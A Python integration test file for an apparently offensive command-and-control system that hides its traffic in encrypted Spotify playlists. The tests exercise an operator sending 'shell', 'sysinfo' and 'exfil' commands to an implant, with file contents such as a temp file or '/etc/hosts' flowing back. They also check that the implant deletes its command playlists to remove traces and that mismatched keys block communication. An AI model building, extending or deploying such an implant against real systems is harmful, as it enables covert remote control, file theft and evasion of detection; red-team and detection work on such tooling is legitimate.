"""Integration tests for the C2 system.

Full-stack tests: operator sends commands, implant executes (mocked),
results flow back. Uses FakeSpotifyStore for in-memory Spotify simulation.
"""

import json
import os
import tempfile
from unittest.mock import patch, MagicMock

import pytest

import c2_protocol as proto
from c2_implant import Implant
from c2_operator import Operator
from tests.test_integration import FakeSpotifyStore

MOCK_ENV = {
    "SPOTIFY_USERNAME": "testuser",
    "SPOTIFY_CLIENT_ID": "fake_id",
    "SPOTIFY_CLIENT_SECRET": "fake_secret",
    "SPOTIFY_REDIRECTURI": "http://localhost:8888/cb",
}

TEST_KEY = "c2-test-key-2026"


@pytest.fixture
def fake_store():
    """Fresh in-memory Spotify store."""
    return FakeSpotifyStore()


@pytest.fixture
def spot_c2(fake_store):
    """Spot instance backed by fake store for C2 testing."""
    with patch.dict(os.environ, MOCK_ENV):
        with patch('spotapi.util.prompt_for_user_token',
                   return_value='fake_token'):
            with patch('spotapi.spotipy.Spotify',
                       return_value=fake_store):
                from spotapi import Spot
                return Spot(use_cover_names=True)


@pytest.fixture
def operator(spot_c2):
    """C2 Operator using the fake store."""
    return Operator(spot_c2, TEST_KEY)


@pytest.fixture
def implant(spot_c2):
    """C2 Implant using the fake store (no polling loop)."""
    return Implant(spot_c2, TEST_KEY, interval=0, jitter=0)


# --- Full C2 Roundtrip Tests ---

class TestC2Roundtrip:
    def test_shell_command_cycle(self, operator, implant, fake_store):
        """Operator sends shell cmd, implant executes, operator gets result."""
        seq = operator.send_command("shell", {"cmd": "echo hello"})
        assert seq == 1
        assert len(fake_store.playlists) > 0

        mock_result = MagicMock()
        mock_result.stdout = "hello\n"
        mock_result.stderr = ""
        mock_result.returncode = 0

        with patch('c2_implant.subprocess.run',
                   return_value=mock_result):
            implant._poll_and_execute()

        cmd_playlists = operator.spotify.read_c2_playlists(
            proto.CHANNEL_CMD, TEST_KEY
        )
        assert len(cmd_playlists) == 0

        res_playlists = operator.spotify.read_c2_playlists(
            proto.CHANNEL_RES, TEST_KEY
        )
        assert len(res_playlists) == 1

        results = operator.poll_result_once()
        assert 1 in results
        assert results[1]["status"] == "ok"
        assert results[1]["data"] == "hello\n"

        assert len(fake_store.playlists) == 0

    def test_sysinfo_command_cycle(self, operator, implant):
        """Sysinfo command roundtrip."""
        seq = operator.send_command("sysinfo")

        implant._poll_and_execute()
        results = operator.poll_result_once()

        assert seq in results
        assert results[seq]["status"] == "ok"
        info = json.loads(results[seq]["data"])
        assert "hostname" in info
        assert "os" in info
        assert "username" in info

    def test_exfil_command_cycle(self, operator, implant):
        """Exfil command roundtrip with real temp file."""
        content = "secret file content\n"
        with tempfile.NamedTemporaryFile(
            mode='w', delete=False, suffix='.txt'
        ) as f:
            f.write(content)
            path = f.name

        try:
            seq = operator.send_command("exfil", {"path": path})
            implant._poll_and_execute()
            results = operator.poll_result_once()

            assert seq in results
            assert results[seq]["status"] == "ok"
            assert results[seq]["data"] == content
        finally:
            os.unlink(path)

    def test_exfil_missing_file(self, operator, implant):
        """Exfil with nonexistent file returns error."""
        seq = operator.send_command(
            "exfil", {"path": "/nonexistent/file.txt"}
        )
        implant._poll_and_execute()
        results = operator.poll_result_once()

        assert seq in results
        assert results[seq]["status"] == "error"

    def test_unknown_module(self, operator, implant):
        """Unknown module returns error result."""
        seq = operator.send_command("badmodule", {"foo": "bar"})
        implant._poll_and_execute()
        results = operator.poll_result_once()

        assert seq in results
        assert results[seq]["status"] == "error"
        assert "Unknown module" in results[seq]["data"]


# --- Multi-Command Queue Tests ---

class TestCommandQueue:
    def test_sequential_commands(self, operator, implant):
        """Multiple commands processed in sequence order."""
        seq1 = operator.send_command("sysinfo")
        seq2 = operator.send_command("sysinfo")
        seq3 = operator.send_command("sysinfo")

        assert seq1 == 1
        assert seq2 == 2
        assert seq3 == 3

        implant._poll_and_execute()

        results = operator.poll_result_once()
        assert set(results.keys()) == {1, 2, 3}
        for r in results.values():
            assert r["status"] == "ok"

    def test_mixed_modules(self, operator, implant):
        """Queue with different module types."""
        operator.send_command("sysinfo")
        operator.send_command("exfil", {"path": "/etc/hosts"})

        implant._poll_and_execute()

        results = operator.poll_result_once()
        assert 1 in results
        assert results[1]["module"] == "sysinfo"


# --- Channel Isolation Tests ---

class TestChannelIsolation:
    def test_cmd_not_in_res_channel(self, operator, spot_c2):
        """Command playlists don't appear in result channel."""
        operator.send_command("sysinfo")

        res = spot_c2.read_c2_playlists(
            proto.CHANNEL_RES, TEST_KEY
        )
        assert len(res) == 0

        cmd = spot_c2.read_c2_playlists(
            proto.CHANNEL_CMD, TEST_KEY
        )
        assert len(cmd) == 1

    def test_res_not_in_cmd_channel(
            self, operator, implant, spot_c2):
        """Result playlists don't appear in command channel."""
        operator.send_command("sysinfo")
        implant._poll_and_execute()

        cmd = spot_c2.read_c2_playlists(
            proto.CHANNEL_CMD, TEST_KEY
        )
        assert len(cmd) == 0

        res = spot_c2.read_c2_playlists(
            proto.CHANNEL_RES, TEST_KEY
        )
        assert len(res) == 1


# --- Cleanup Tests ---

class TestCleanup:
    def test_full_cycle_cleanup(
            self, operator, implant, fake_store):
        """After full cycle, no C2 playlists remain."""
        operator.send_command("sysinfo")
        implant._poll_and_execute()
        operator.poll_result_once()

        assert len(fake_store.playlists) == 0

    def test_operator_clean_all(self, operator, fake_store):
        """clean_all removes all C2 playlists."""
        operator.send_command("sysinfo")
        operator.send_command("sysinfo")
        assert len(fake_store.playlists) > 0

        operator.clean_all()
        assert len(fake_store.playlists) == 0

    def test_implant_cleans_cmd_after_exec(
            self, operator, implant, spot_c2):
        """Implant deletes command playlists after execution."""
        operator.send_command("sysinfo")

        cmd_before = spot_c2.read_c2_playlists(
            proto.CHANNEL_CMD, TEST_KEY
        )
        assert len(cmd_before) == 1

        implant._poll_and_execute()

        cmd_after = spot_c2.read_c2_playlists(
            proto.CHANNEL_CMD, TEST_KEY
        )
        assert len(cmd_after) == 0


# --- Duplicate Prevention Tests ---

class TestDuplicatePrevention:
    def test_processed_seq_not_re_executed(
            self, operator, implant):
        """Implant skips already processed seqs."""
        operator.send_command("sysinfo")

        implant._poll_and_execute()
        results1 = operator.poll_result_once()
        assert 1 in results1

        operator.send_command("sysinfo")

        implant.processed_seqs.add(1)
        implant._poll_and_execute()

        results2 = operator.poll_result_once()
        assert 2 in results2


# --- Encryption Tests ---

class TestC2Encryption:
    def test_wrong_key_implant_skips(self, spot_c2, fake_store):
        """Implant with wrong key skips undecryptable commands."""
        op = Operator(spot_c2, "operator-key")
        imp = Implant(
            spot_c2, "wrong-key", interval=0, jitter=0
        )

        op.send_command("sysinfo")
        imp._poll_and_execute()

        res = spot_c2.read_c2_playlists(
            proto.CHANNEL_RES, TEST_KEY
        )
        assert len(res) == 0

    def test_correct_key_works(self, operator, implant):
        """Matching keys allow full communication."""
        operator.send_command("sysinfo")
        implant._poll_and_execute()
        results = operator.poll_result_once()
        assert 1 in results
        assert results[1]["status"] == "ok"
